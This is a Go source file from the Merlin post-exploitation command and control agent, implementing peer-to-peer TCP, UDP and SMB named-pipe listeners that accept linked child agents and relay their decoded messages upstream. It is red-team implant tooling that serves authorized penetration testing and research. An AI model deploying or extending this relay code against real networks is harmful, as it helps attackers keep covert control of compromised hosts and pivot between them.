/*
Merlin is a post-exploitation command and control framework.

This file is part of Merlin.
Copyright (C) 2024 Russel Van Tuyl

Merlin is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
any later version.

Merlin is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with Merlin.  If not, see <http://www.gnu.org/licenses/>.
*/

package commands

import (
	// Standard
	"bytes"
	"encoding/binary"
	"encoding/gob"
	"errors"
	"fmt"
	"io"
	"net"
	"strings"
	"time"

	// Merlin
	"github.com/Ne0nd0g/merlin-message"
	"github.com/Ne0nd0g/merlin-message/jobs"

	// Internal
	"github.com/Ne0nd0g/merlin-agent/v2/cli"
	"github.com/Ne0nd0g/merlin-agent/v2/p2p"
)

const (
	TCP = 0
	UDP = 1
	SMB = 2
)

const (
	// MaxSizeUDP is the maximum size that a UDP fragment can be, following the moderate school of thought due to 1500 MTU
	// http://ithare.com/udp-from-mog-perspective/
	MaxSizeUDP = 1450
)

// p2pListener is a structure for managing and tracking peer to peer listeners created on this Agent as the parent used
// to communicate with child Agents
type p2pListener struct {
	Addr     string      // Addr is a string representation of the address the listener is communicating with
	Listener interface{} // Listener holds the connection (e.g., net.Listener for TCP and net.PacketConn for UDP)
	Type     int         // Type is the p2pListener type
}

// String returns a string representation of the p2pListener
func (p *p2pListener) String() string {
	switch p.Type {
	case TCP:
		return "TCP"
	case UDP:
		return "UDP"
	case SMB:
		return "SMB"
	default:
		return fmt.Sprintf("commands/listener/p2pListener.String() unhandled p2pListener type %d", p.Type)
	}
}

// p2pListeners is a slice of instantiated network listeners
var p2pListeners []p2pListener

// Listener binds to the provided interface and port and begins listening for incoming connections from other peer-to-peer agents
func Listener(cmd jobs.Command) (results jobs.Results) {
	cli.Message(cli.DEBUG, fmt.Sprintf("commands/listen.Listener(): entering into function with %+v", cmd))
	defer cli.Message(cli.DEBUG, fmt.Sprintf("commands/listen.Listener(): exiting function with results: %+v", results))

	if len(cmd.Args) < 1 {
		return jobs.Results{Stderr: fmt.Sprintf("expected 1 arguments with the listener command, received %d: %+v", len(cmd.Args), cmd.Args)}
	}

	// switch on first argument
	switch strings.ToLower(cmd.Args[0]) {
	case "list":
		results.Stdout = fmt.Sprintf("Peer-to-Peer Listeners (%d):\n", len(p2pListeners))
		for i, listener := range p2pListeners {
			results.Stdout += fmt.Sprintf("%d. %s listener on %s\n", i, listener.String(), listener.Addr)
		}
		return
	case "start":
		if len(cmd.Args) < 3 {
			return jobs.Results{Stderr: fmt.Sprintf("expected 3 arguments with the listener command, received %d: %+v", len(cmd.Args), cmd.Args)}
		}
		switch strings.ToLower(cmd.Args[1]) {
		case "tcp":
			err := ListenTCP(cmd.Args[2])
			if err != nil {
				results.Stderr = err.Error()
				return
			}
			results.Stdout = fmt.Sprintf("Successfully started TCP listener on %s", cmd.Args[2])
			return
		case "udp":
			err := ListenUDP(cmd.Args[2])
			if err != nil {
				results.Stderr = err.Error()
				return
			}
			results.Stdout = fmt.Sprintf("Successfully started UDP listener on %s", cmd.Args[2])
			return
		case "smb":
			err := ListenSMB(cmd.Args[2])
			if err != nil {
				results.Stderr = err.Error()
				return
			}
			results.Stdout = fmt.Sprintf("Successfully started SMB listener on \\\\.\\pipe\\%s", cmd.Args[2])
			return
		default:
			results.Stderr = fmt.Sprintf("Unknown listener type %s", cmd.Args[1])
		}
	case "stop":
		if len(cmd.Args) < 3 {
			return jobs.Results{Stderr: fmt.Sprintf("expected 3 arguments with the listener command, received %d: %+v", len(cmd.Args), cmd.Args)}
		}
		switch strings.ToLower(cmd.Args[1]) {
		case "smb":
			for i, listener := range p2pListeners {
				if listener.Type == SMB {
					if listener.Listener.(net.Listener).Addr().String() == fmt.Sprintf("\\\\.\\pipe\\%s", cmd.Args[2]) {
						err := listener.Listener.(net.Listener).Close()
						if err != nil {
							results.Stderr = err.Error()
						} else {
							results.Stdout = fmt.Sprintf("Successfully closed SMB listener on %s", cmd.Args[2])
						}
						p2pListeners = append(p2pListeners[:i], p2pListeners[i+1:]...)
						return
					}
				}
			}
			results.Stderr = fmt.Sprintf("Unable to find and close SMB listener on %s", cmd.Args[2])
		case "tcp":
			for i, listener := range p2pListeners {
				if listener.Type == TCP {
					if listener.Listener.(net.Listener).Addr().String() == cmd.Args[2] {
						err := listener.Listener.(net.Listener).Close()
						if err != nil {
							results.Stderr = err.Error()
						} else {
							results.Stdout = fmt.Sprintf("Successfully closed TCP listener on %s", cmd.Args[2])
						}
						p2pListeners = append(p2pListeners[:i], p2pListeners[i+1:]...)
						return
					}
				}
			}
			results.Stderr = fmt.Sprintf("Unable to find and close TCP listener on %s", cmd.Args[2])
		case "udp":
			for i, listener := range p2pListeners {
				if listener.Type == UDP {
					if listener.Listener.(net.PacketConn).LocalAddr().String() == cmd.Args[2] {
						err := listener.Listener.(net.PacketConn).Close()
						if err != nil {
							results.Stderr = err.Error()
						} else {
							results.Stdout = fmt.Sprintf("Successfully closed UDP listener on %s", cmd.Args[2])
						}
						p2pListeners = append(p2pListeners[:i], p2pListeners[i+1:]...)
						return
					}
				}
			}
			results.Stderr = fmt.Sprintf("Unable to find and close UDP listener on %s", cmd.Args[2])
		default:
			results.Stderr = fmt.Sprintf("Unknown listener type %s", cmd.Args[1])
		}
		return
	default:
		return jobs.Results{
			Stderr: fmt.Sprintf("Unknown listener command: %s", cmd.Args[0]),
		}
	}
	return
}

// ListenTCP binds to the provided address and listens for incoming TCP connections
func ListenTCP(addr string) error {
	listener, err := net.Listen("tcp", addr)
	if err != nil {
		return fmt.Errorf("commands/listen.TCPListen(): there was an error listening on %s : %s", addr, err)
	}

	// Add to global listeners
	var ok bool
	var l p2pListener
	for _, l = range p2pListeners {
		if l.Type == TCP {
			// Check to see if there is already a p2pListener in the map for this address
			if listener.Addr() == l.Listener.(net.Listener).Addr() {
				ok = true
				break
			}
		}

	}

	if !ok {
		l = p2pListener{
			Addr:     listener.Addr().String(),
			Listener: listener,
			Type:     TCP,
		}
		p2pListeners = append(p2pListeners, l)
	}

	cli.Message(cli.NOTE, fmt.Sprintf("Started TCP listener on %s and waiting for a connection...", addr))

	// Listen for initial connection from upstream agent
	go accept(listener, p2p.TCPREVERSE)
	return nil
}

// ListenUDP binds to the provided address and listens for incoming UDP connections
func ListenUDP(addr string) error {
	listener, err := net.ListenPacket("udp", addr)
	if err != nil {
		return fmt.Errorf("commands/listen.ListenUDP(): there was an error listening on %s : %s", addr, err)
	}
	cli.Message(cli.NOTE, fmt.Sprintf("Started UDP listener on %s and waiting for a connection...", addr))

	// Add to global listeners
	var ok bool
	for _, l := range p2pListeners {
		if l.Type == UDP {
			if listener.LocalAddr() == l.Listener.(net.PacketConn).LocalAddr() {
				ok = true
			}
		}
	}
	if !ok {
		p2pListeners = append(p2pListeners, p2pListener{
			Addr:     listener.LocalAddr().String(),
			Type:     UDP,
			Listener: listener,
		})
	}

	go listenUDP(listener)
	return nil
}

// accept is an infinite loop listening for new connections from Agents
func accept(listener net.Listener, listenerType int) {
	for {
		conn, err := listener.Accept()
		if err != nil {
			cli.Message(cli.WARN, fmt.Sprintf("commands/listen.accept(): there was an error accepting the connection: %s", err))
			break
		}
		go listen(conn, listenerType)
	}
}

// listen is an infinite loop, used as a go routine, to receive data from incoming connections and subsequently add Delegate messages to the outgoing queue
func listen(conn net.Conn, listenerType int) {
	for {
		var n int
		var err error
		var tag uint32
		var length uint64
		var buff bytes.Buffer
		for {
			data := make([]byte, 4096)
			n, err = conn.Read(data)
			if err != nil {
				if errors.Is(err, io.EOF) {
					cli.Message(cli.WARN, fmt.Sprintf("commands/listener.listen(): connection to %s closed, removing the listener connection.", conn.RemoteAddr()))
					// Delete the listener from the global listeners
					for i, l := range p2pListeners {
						if l.Listener.(net.Listener).Addr() == conn.LocalAddr() {
							p2pListeners = append(p2pListeners[:i], p2pListeners[i+1:]...)
							return
						}
					}
				}
				err = fmt.Errorf("commands/listener.listen(): there was an error reading data from linked agent %s: %s", conn.RemoteAddr(), err)
				break
			}

			// Add the bytes to the buffer
			n, err = buff.Write(data[:n])
			if err != nil {
				err = fmt.Errorf("commands/listener.listen(): there was an error writing %d bytes from linked agent into the buffer %s: %s", n, conn.RemoteAddr(), err)
				break
			}

			// If this is the first read on the connection determine the tag and data length
			if tag == 0 {
				// Ensure we have enough data to read the tag/type which is 4-bytes
				if buff.Len() < 4 {
					cli.Message(cli.DEBUG, fmt.Sprintf("commands/listener.listen(): Need at least 4 bytes in the buffer to read the Type/Tag for TLV but only have %d", buff.Len()))
					continue
				}
				tag = binary.BigEndian.Uint32(data[:4])
				if tag != 1 {
					err = fmt.Errorf("commands/listener.listen(): Expected a type/tag value of 1 for TLV but got %d", tag)
					break
				}
			}

			if length == 0 {
				// Ensure we have enough data to read the Length from TLV which is 8-bytes plus the 4-byte tag/type size
				if buff.Len() < 12 {
					cli.Message(cli.DEBUG, fmt.Sprintf("commands/listener.listen(): Need at least 12 bytes in the buffer to read the Length for TLV but only have %d", buff.Len()))
					continue
				}
				length = binary.BigEndian.Uint64(data[4:12])
			}

			// If we've read all the data according to the length provided in TLV, then break the for loop
			// Type/Tag size is 4-bytes, Length size is 8-bytes for TLV
			if uint64(buff.Len()) == length+4+8 {
				cli.Message(cli.DEBUG, fmt.Sprintf("commands/listener.listen(): Finished reading data length of %d bytes into the buffer and moving forward to deconstruct the data", length))
				break
			} else {
				cli.Message(cli.DEBUG, fmt.Sprintf("commands/listener.listen(): Read %d of %d bytes into the buffer", buff.Len(), length))
			}
		}
		cli.Message(cli.NOTE, fmt.Sprintf("listener on %s read %d bytes from linked Agent %s at %s", conn.LocalAddr(), buff.Len(), conn.RemoteAddr(), time.Now().UTC().Format(time.RFC3339)))

		// Check for errors from the nested FOR loop
		if err != nil {
			cli.Message(cli.WARN, err.Error())
			break
		}

		// Gob decode the message
		var msg messages.Delegate
		reader := bytes.NewReader(buff.Bytes()[12:])
		err = gob.NewDecoder(reader).Decode(&msg)
		if err != nil {
			cli.Message(cli.WARN, fmt.Sprintf("commands/listener.listen(): there was an error gob decoding a delegate message: %s", err))
			return
		}

		// Store LinkedAgent
		_, err = peerToPeerService.GetLink(msg.Agent)
		if err != nil {
			// Reverse SMB & TCP agents need to be added after initial checkin
			linkedAgent := p2p.NewLink(msg.Agent, msg.Listener, conn, listenerType, conn.RemoteAddr())
			peerToPeerService.AddLink(linkedAgent)
		} else {
			// Update the Link's connection to the current one
			err = peerToPeerService.UpdateConnection(msg.Agent, conn, conn.RemoteAddr())
			if err != nil {
				cli.Message(cli.WARN, fmt.Sprintf("commands/listener.listen(): %s", err))
			}
		}

		// Add the message to the queue
		peerToPeerService.AddDelegate(msg)
	}
}

// listenUDP is an infinite loop, used as a go routine, to receive data from incoming connections and subsequently add Delegate messages to the outgoing queue
func listenUDP(listener net.PacketConn) {
	cli.Message(cli.DEBUG, fmt.Sprintf("command/listener.listenUDP(): entering into function with listener: %+v", listener))
	defer cli.Message(cli.DEBUG, "command/listener.listenUDP(): exiting function")

	for {
		var err error
		var addr net.Addr
		var n int
		var tag uint32
		var length uint64
		var buff bytes.Buffer
		for {
			data := make([]byte, MaxSizeUDP)
			n, addr, err = listener.ReadFrom(data)
			cli.Message(cli.DEBUG, fmt.Sprintf("UDP listener read %d bytes on %s from %s at %s", n, listener.LocalAddr(), addr, time.Now().UTC().Format(time.RFC3339)))
			if err != nil {
				err = fmt.Errorf("commands/listener.listenUDP(): there was an error accepting the UDP connection from %s : %s", addr, err)
				break
			}

			// Add the bytes to the buffer
			n, err = buff.Write(data[:n])
			if err != nil {
				err = fmt.Errorf("commands/listener.listenUDP(): there was an error writing %d bytes from linked agent into the buffer %s: %s", n, addr, err)
				break
			}

			// If this is the first read on the connection determine the tag and data length
			if tag == 0 {
				// Ensure we have enough data to read the tag/type which is 4-bytes
				if buff.Len() < 4 {
					cli.Message(cli.DEBUG, fmt.Sprintf("commands/listener.listenUDP(): Need at least 4 bytes in the buffer to read the Type/Tag for TLV but only have %d", buff.Len()))
					continue
				}
				tag = binary.BigEndian.Uint32(data[:4])
				if tag != 1 {
					err = fmt.Errorf("commands/listener.listenUDP(): Expected a type/tag value of 1 for TLV but got %d", tag)
					break
				}
			}

			if length == 0 {
				// Ensure we have enough data to read the Length from TLV which is 8-bytes plus the 4-byte tag/type size
				if buff.Len() < 12 {
					cli.Message(cli.DEBUG, fmt.Sprintf("commands/listener.listenUDP(): Need at least 12 bytes in the buffer to read the Length for TLV but only have %d", buff.Len()))
					continue
				}
				length = binary.BigEndian.Uint64(data[4:12])
			}

			// If we've read all the data according to the length provided in TLV, then break the for loop
			// Type/Tag size is 4-bytes, Length size is 8-bytes for TLV
			if uint64(buff.Len()) == length+4+8 {
				cli.Message(cli.DEBUG, fmt.Sprintf("commands/listener.listenUDP(): Finished reading data length of %d bytes into the buffer and moving forward to deconstruct the data", length))
				break
			} else {
				cli.Message(cli.DEBUG, fmt.Sprintf("commands/listener.listenUDP(): Read %d of %d bytes into the buffer", buff.Len(), length))
			}
		}
		cli.Message(cli.NOTE, fmt.Sprintf("UDP listener on %s read %d bytes from %s at %s", listener.LocalAddr(), buff.Len(), addr, time.Now().UTC().Format(time.RFC3339)))

		// Check for errors from the nested FOR loop
		if err != nil {
			cli.Message(cli.WARN, err.Error())
			break
		}

		// Gob decode the message
		var msg messages.Delegate
		reader := bytes.NewReader(buff.Bytes()[12:])
		err = gob.NewDecoder(reader).Decode(&msg)
		if err != nil {
			cli.Message(cli.WARN, fmt.Sprintf("commands/listener.listenUDP(): there was an error gob decoding a delegate message: %s", err))
			return
		}

		// Store LinkedAgent
		_, err = peerToPeerService.GetLink(msg.Agent)
		if err != nil {
			// Reverse UDP agents need to be added after initial checkin
			linkedAgent := p2p.NewLink(msg.Agent, msg.Listener, listener, p2p.UDPREVERSE, addr)
			peerToPeerService.AddLink(linkedAgent)
		} else {
			// Update the Link's connection to the current one
			err = peerToPeerService.UpdateConnection(msg.Agent, listener, addr)
			if err != nil {
				cli.Message(cli.WARN, fmt.Sprintf("commands/listener.listen(): %s", err))
			}
		}

		// Add the message to the queue
		peerToPeerService.AddDelegate(msg)
	}
}
